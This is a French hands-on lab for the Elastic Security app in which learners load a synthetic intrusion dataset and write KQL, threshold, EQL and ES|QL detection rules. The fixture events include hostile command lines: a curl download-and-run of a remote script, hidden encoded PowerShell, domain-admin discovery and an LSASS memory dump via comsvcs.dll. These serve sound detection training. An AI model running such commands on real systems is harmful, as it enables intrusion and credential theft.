# TP 5 — L'app Security et les règles de détection

> Explorer les hôtes, les utilisateurs et le réseau dans l'app Security, puis écrire quatre règles — KQL, seuil, EQL, ES|QL — et les voir lever des alertes.

**Topic** : Security App — Detection rules

## Contexte

L'investigation des TP 3 et 4 était manuelle. Le SOC veut que la prochaine fois, **une règle** lève l'alerte toute seule.

## Setup

Ce TP est autonome. Il utilise le **jeu de données du lab** : 25 événements ECS, dans le data stream `logs-lab-default`. Le pipeline `lab-replay` décale leurs dates, pour que le dernier ait eu lieu il y a 10 minutes — réglez le sélecteur de temps de Kibana sur **Last 4 hours**.

Envoyez ce bloc dans **Dev Tools** (le `DELETE` vide un éventuel chargement précédent) :

```json
DELETE /_data_stream/logs-lab-default

PUT /_ingest/pipeline/lab-replay
{
  "description": "Rejoue le jeu de données du lab : décale les événements pour que le dernier ait eu lieu il y a 10 minutes",
  "processors": [
    {
      "script": {
        "source": "ZonedDateTime ts = ZonedDateTime.parse(ctx['@timestamp']); long ms = ChronoUnit.MILLIS.between(ts, ZonedDateTime.parse(params.end)); ctx['@timestamp'] = metadata().now.minus(ms, ChronoUnit.MILLIS).toString();",
        "params": { "end": "2026-10-01T10:30:00Z" }
      }
    }
  ]
}

POST /logs-lab-default/_bulk?pipeline=lab-replay&refresh
{"create":{}}
{"@timestamp":"2026-10-01T07:55:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"deploy"},"source":{"ip":"10.0.0.12"},"message":"Accepted publickey for deploy from 10.0.0.12 port 40022 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52311 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52321 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:20Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52331 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:30Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52341 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:40Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52351 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:01:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Accepted password for admin from 203.0.113.50 port 52400 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"curl","command_line":"curl -s http://198.51.100.7/x.sh -o /tmp/x.sh","pid":4101,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"bash","command_line":"bash /tmp/x.sh","pid":4102,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:03:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"crontab","command_line":"crontab -l","pid":4110,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T09:58:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"winword.exe","command_line":"\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n invoice.docm","pid":7001,"parent":{"name":"explorer.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgA","pid":7300,"parent":{"name":"winword.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:05Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"updater.exe","command_line":"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe","pid":7312,"parent":{"name":"powershell.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:01:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:02:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:04:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:05:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:06:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"chrome.exe","pid":5120},"source":{"ip":"10.0.0.42","bytes":2048},"destination":{"ip":"142.250.74.110","port":443,"bytes":88000},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"whoami.exe","command_line":"whoami /all","pid":7350,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"net.exe","command_line":"net group \"Domain Admins\" /domain","pid":7351,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:15:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":4096},"destination":{"ip":"10.0.0.20","port":445,"bytes":1024},"network":{"transport":"tcp","direction":"internal"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:16:00Z","host":{"name":"db-01","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"svc_backup"},"process":{"name":"rundll32.exe","command_line":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full","pid":8800,"parent":{"name":"services.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:20:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":48000000},"destination":{"ip":"198.51.100.7","port":443,"bytes":2048},"network":{"transport":"tcp","direction":"egress"}}
```

Résultat attendu (extrait) :

```json
{ "errors": false }
```

Ajoutez ensuite `logs-lab-*` aux index de l'app Security : **Stack Management** → **Advanced settings** → *Security Solution* → `securitySolution:defaultIndex`, ajoutez `logs-lab-*`, **Save**.

## Exercice 1 — Hosts

1. **Security** → **Explore** → **Hosts**, temps **Last 4 hours**.
2. Ouvrez `ws-02`. Onglet **Uncommon processes** : lesquels ?
3. Onglet **Events** : filtrez sur `event.category: process` et lisez la chaîne de parents.

<details>
<summary>Réponse</summary>

`winword.exe` → `powershell.exe` (`-enc`) → `updater.exe`, qui lance ensuite `whoami.exe` et `net.exe`.

</details>

## Exercice 2 — Users et Network

1. **Explore** → **Users** → `admin` → **Authentications** : combien d'échecs, depuis où ?
2. **Explore** → **Network** → **Flows** : quelle destination reçoit le plus d'octets ?
3. Ouvrez la page de l'IP `198.51.100.7` : quels hôtes lui ont parlé ?

## Exercice 3 — Data quality

**Security** → **Dashboards** → **Data quality** : cochez `logs-lab-default`, **Check all**.

**Question** : le jeu de données respecte-t-il ECS ?

## Exercice 4 — Règle « Custom query » en KQL

**Rules** → **Detection rules (SIEM)** → **Create new rule** → **Custom query**.

| Champ | Valeur |
|-------|--------|
| Index patterns | `logs-lab-*` |
| Query | `event.category: process and process.name: "powershell.exe" and process.command_line: (*-enc* or *-EncodedCommand*)` |
| Name | `Encoded PowerShell command` |
| Severity / Risk score | Medium / 47 |
| MITRE ATT&CK | Execution — T1059.001 PowerShell |
| Runs every / Look-back | 5 minutes / **4 hours** (pour rattraper le jeu de données) |

**Preview** : 1 résultat. **Create & enable rule**.

## Exercice 5 — Règle « Threshold »

| Champ | Valeur |
|-------|--------|
| Query | `event.category: authentication and event.outcome: failure` |
| Group by | `source.ip` |
| Threshold | `>= 5` |
| Name | `Repeated failed logons from one IP` |
| MITRE ATT&CK | Credential Access — T1110 Brute Force |

Avant de créer la règle, vérifiez le seuil dans Dev Tools :

```json
POST /logs-lab-default/_search
{
  "size": 0,
  "query": {
    "bool": {
      "filter": [
        { "term": { "event.category": "authentication" } },
        { "term": { "event.outcome": "failure" } }
      ]
    }
  },
  "aggs": { "by_ip": { "terms": { "field": "source.ip", "min_doc_count": 5 } } }
}
```

Résultat attendu (extrait) :

```json
{
  "aggregations": {
    "by_ip": { "buckets": [{ "key": "203.0.113.50", "doc_count": 5 }] }
  }
}
```

## Exercice 6 — Règle « Event correlation » en EQL

Un brute force **suivi d'un succès** est bien plus grave qu'un brute force. Testez la séquence :

```json
POST /logs-lab-default/_eql/search?filter_path=hits.total,hits.sequences.join_keys
{
  "query": """
    sequence by host.name, source.ip with maxspan=5m
      [authentication where event.outcome == "failure"] with runs=3
      [authentication where event.outcome == "success"]
  """
}
```

Résultat attendu :

```json
{
  "hits": {
    "total": { "value": 1 },
    "sequences": [{ "join_keys": ["web-01", "203.0.113.50"] }]
  }
}
```

Puis créez une règle **Event correlation** avec cette requête : `SSH brute force followed by a success`, severity **High**, risk score 73, MITRE *Credential Access — T1110*.

## Exercice 7 — Règle ES|QL

Une exfiltration : plus de 10 Mo vers une même destination.

```json
POST /_query?format=json&filter_path=values
{
  "query": """
    FROM logs-lab-default
    | WHERE network.direction == "egress"
    | STATS sent = SUM(source.bytes) BY host.name, destination.ip
    | WHERE sent > 10000000
  """
}
```

Résultat attendu :

```json
{ "values": [[48003072, "ws-02", "198.51.100.7"]] }
```

Créez une règle **ES|QL** avec cette requête (remplacez `logs-lab-default` par `logs-lab-*`) : `Large upload to one destination`, severity **High**, MITRE *Exfiltration — T1041*.

## Exercice 8 — Les alertes arrivent

1. **Alerts** : attendez la première exécution des règles (moins de 5 minutes).
2. **Group by** : *Rule name*. Combien d'alertes par règle ?
3. Vérifiez dans Dev Tools (les alertes sont des documents) :

<!-- ci: skip -->
```json
POST /_query?format=txt
{
  "query": """
    FROM .alerts-security.alerts-default
    | STATS alerts = COUNT(*) BY kibana.alert.rule.name, host.name
    | SORT alerts DESC
  """
}
```

<details>
<summary>Réponse</summary>

| Règle | Alertes |
|-------|---------|
| SSH brute force followed by a success | 5 (une par événement de la séquence) |
| Encoded PowerShell command | 1 |
| Repeated failed logons from one IP | 1 |
| Large upload to one destination | 1 |

</details>

## Exercice 9 — MITRE ATT&CK coverage

**Rules** → **MITRE ATT&CK® coverage** : vos quatre règles couvrent Execution, Credential Access et Exfiltration. Quelles tactiques du jeu de données restent sans règle ?

<details>
<summary>Réponse</summary>

Command and Control (le beacon), Discovery (`whoami`, `net group`), Lateral Movement (SMB vers `10.0.0.20`), Credential Access par dump LSASS — le TP 7 les chasse.

</details>

## Critères de succès

- [ ] Vous avez lu les pages Hosts, Users et Network de `ws-02`, `admin` et `198.51.100.7`
- [ ] Quatre règles activées, de quatre types différents
- [ ] Chaque règle a levé au moins une alerte
- [ ] Chaque règle a sa tactique et sa technique MITRE ATT&CK

## Dépannage

| Symptôme | Cause probable | Solution |
|----------|----------------|----------|
| Aucune alerte | Look-back trop court | **Additional look-back time** : 4 heures |
| La règle échoue : *missing index* | Index pattern | `logs-lab-*`, et rechargez le setup |
| Hosts vide | `logs-lab-*` absent de `securitySolution:defaultIndex` | Advanced settings, voir le setup |
| La règle ES\|QL ne lève qu'une alerte | Requête agrégée | Normal : une alerte par ligne |

## Pour aller plus loin

- **Add Elastic rules** : installez les règles prébuilt *Linux* et *Windows*, et regardez lesquelles se déclenchent.
- **Alert suppression** sur la règle EQL : une seule alerte par `host.name` pendant 1 heure.
- **Export** des règles en NDJSON : la détection *as code*.
